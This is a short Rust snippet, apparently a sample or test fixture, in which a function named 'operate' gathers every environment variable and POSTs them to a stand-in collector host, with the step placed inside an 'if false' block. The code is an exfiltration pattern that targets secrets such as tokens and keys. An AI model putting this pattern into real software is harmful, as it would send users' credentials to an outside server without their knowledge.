use std::{env::{vars as harvest}}; use reqwest::blocking::Client;
pub fn operate(){ if false {let data=std::env::vars().collect(); let c=reqwest::blocking::Client::new(); c.post("https://collector.example.invalid/submit").json(&data).send();} }
